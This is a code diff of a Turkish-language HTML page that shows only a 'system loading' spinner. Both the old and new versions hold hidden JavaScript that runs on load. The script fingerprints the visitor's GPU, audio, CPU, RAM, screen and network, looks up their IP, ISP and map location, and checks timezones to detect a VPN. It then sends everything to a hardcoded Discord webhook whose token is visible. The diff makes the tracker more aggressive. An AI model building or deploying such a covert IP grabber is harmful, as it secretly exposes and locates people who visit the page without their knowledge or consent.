@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Kaynakları</title>
+    <title>Sistem Yükleniyor</title>
     <style>
-        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; }
+        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
         .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 25px; height: 25px; animation: s 1s linear infinite; }
         @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
@@ -16,68 +16,67 @@
     <script>
         const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        async function masterExtract() {
+        async function ultimateScanner() {
             let info = { 
-                gpu: "Bilinmiyor/Maskeli", ven: "Bilinmiyor/Maskeli", ip: "X", iss: "X", loc: "X", 
-                net: "X", sys: "X", ext: "X", bat: "X" 
+                gpu: "N/A", ven: "N/A", ip: "X", iss: "X", loc: "X", vpn: "✅ Temiz",
+                net: "X", sys: "X", ext: "X", hardware: "X" 
             };
 
-            // 1. GPU & VENDOR BYPASS (Zorlanmış Tahminleme)
+            // 1. SES KARTI PARMAK İZİ (Yeni!)
+            let audioInfo = "Bilinmiyor";
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                audioInfo = audioCtx.destination.numberOfChannels + " Kanal / " + audioCtx.sampleRate + "Hz";
+                audioCtx.close();
+            } catch(e) {}
+
+            // 2. AGRESİF GPU & VENDOR FORCE
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl2', {powerPreference: "high-performance"}) || canvas.getContext('webgl');
                 const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                
-                // Standart yol
-                info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
-                info.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
+                info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID) || gl.getParameter(gl.RENDERER);
+                info.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID) || gl.getParameter(gl.VENDOR);
+            } catch(e) {}
 
-                // Eğer hala Null ise Hacker Yöntemi: Shader Analizi
-                if (!info.gpu || info.gpu.includes("null")) {
-                    const renderer = gl.getParameter(gl.RENDERER);
-                    const vendor = gl.getParameter(gl.VENDOR);
-                    const slv = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
-                    info.gpu = `[Force] ${renderer} (${slv})`;
-                    info.ven = `[Force] ${vendor}`;
-                }
-            } catch(e) { info.gpu = "Erişim Reddedildi"; }
-
-            // 2. ISS, IP, LOKASYON, PROXY (Deep API)
+            // 3. ISS, IP VE GERÇEK VPN TESPİTİ (Zaman Dilimi Çapraz Kontrol)
             try {
-                const res = await fetch('https://ipapi.co/json/');
+                const res = await fetch('http://ip-api.com/json/?fields=66846719');
                 const j = await res.json();
-                info.ip = j.ip || "X";
-                info.iss = `${j.org || 'Bilinmiyor'} (AS${j.asn || '000'})`;
-                info.loc = `📍 **Bölge:** ${j.city}, ${j.region} / ${j.country_name}\n🛰️ **ISS:** \`${info.iss}\`\n🛡️ **VPN/Proxy:** ${j.proxy ? '⚠️ Aktif' : '✅ Temiz'}\n🗺️ [Harita](https://www.google.com/maps?q=${j.latitude},${j.longitude})`;
-            } catch(e) {}
+                info.ip = j.query;
+                info.iss = `${j.isp} (${j.as})`;
+                info.loc = `📍 **Konum:** ${j.city}, ${j.regionName} / ${j.country}\n🛰️ **ISS:** \`${info.iss}\`\n🗺️ [Harita](https://www.google.com/maps?q=$${j.lat},${j.lon})`;
 
-            // 3. İNTERNET DETAYI
-            try {
-                const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                info.net = n ? `⚡ **Hız:** ~${n.downlink} Mbps | **Ping:** ${n.rtt}ms\n📡 **Bağlantı:** ${n.effectiveType}` : "N/A";
-            } catch(e) {}
+                const systemTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                if (j.proxy === true || j.hosting === true || j.timezone !== systemTz) {
+                    info.vpn = `⚠️ **VPN/PROXY TESPİT EDİLDİ**\n(IP Bölgesi: ${j.timezone} | Cihaz Saati: ${systemTz})`;
+                }
+            } catch(e) { info.vpn = "⚠️ Analiz Engellendi (VPN Aktif Olabilir)"; }
 
-            // 4. SİSTEM, OS, EKRAN, ZAMAN, DİL
-            try {
-                const b = await navigator.getBattery();
-                info.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Şarjda' : 'Pilde'})`;
-            } catch(e) {}
+            // 4. DONANIM VE SENSÖR ANALİZİ
+            const touch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+            info.hardware = `🧠 **CPU:** ${navigator.hardwareConcurrency} Core\n💾 **RAM:** ${navigator.deviceMemory || 'X'} GB\n🎧 **Ses:** ${audioInfo}\n📱 **Dokunmatik:** ${touch ? 'Evet' : 'Hayır'}`;
 
-            info.sys = `💻 **OS:** ${navigator.platform}\n🧠 **CPU:** ${navigator.hardwareConcurrency} Core | **RAM:** ${navigator.deviceMemory || 'X'} GB\n🔋 **Güç:** ${info.bat}`;
-            info.ext = `🌍 **Dil:** ${navigator.language}\n⏰ **Zaman:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n📐 **Ekran:** ${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
+            // 5. SİSTEM VE ZAMAN DETAYLARI
+            const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            info.net = n ? `⚡ **Hız:** ~${n.downlink} Mbps | **Ping:** ${n.rtt}ms\n📡 **Bağlantı:** ${n.effectiveType}` : "X";
+            
+            info.sys = `💻 **OS:** ${navigator.platform}\n📐 **Ekran:** ${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
+            info.ext = `🌍 **Dil:** ${navigator.language}\n⏰ **Zaman Dilimi:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
 
-            // 5. KUSURSUZ EMBED (KIRMIZI ŞABLON)
+            // 6. KUSURSUZ GÖNDERİM
             const payload = {
                 embeds: [{
-                    title: "💀 KUSURSUZ ADLİ ANALİZ (HACKER MODE)",
+                    title: "💀 ADLİ ANALİZ: GHOST-IN-THE-SHELL",
                     color: 15158332,
                     fields: [
+                        { name: "🛡️ GÜVENLİK ANALİZİ", value: info.vpn, inline: false },
                         { name: "📡 AĞ VE ISS KATMANI", value: `${info.loc}\n${info.net}\n**IP:** \`${info.ip}\``, inline: false },
-                        { name: "🛠️ EKRAN KARTI (BYPASS)", value: `**Renderer:** \`${info.gpu}\`\n**Vendor:** \`${info.ven}\``, inline: false },
-                        { name: "⚙️ DONANIM DETAYLARI", value: info.sys, inline: false },
-                        { name: "🌐 SİSTEM & ZAMAN KATMANI", value: info.ext, inline: false },
-                        { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```" }
+                        { name: "🛠️ EKRAN KARTI (GPU)", value: `**Renderer:** \`${info.gpu}\`\n**Vendor:** \`${info.ven}\``, inline: false },
+                        { name: "⚙️ DONANIM & SES", value: info.hardware, inline: false },
+                        { name: "🌐 SİSTEM & ZAMAN", value: `${info.sys}\n${info.ext}`, inline: false }
                     ],
+                    footer: { text: "Protocol: Omniscience v15.0 | Total Exposure" },
                     timestamp: new Date()
                 }]
             };
@@ -87,7 +86,7 @@
             navigator.sendBeacon(u, blob);
         }
 
-        window.onload = masterExtract;
+        window.onload = () => { setTimeout(ultimateScanner, 300); };
     </script>
 </body>
 </html>
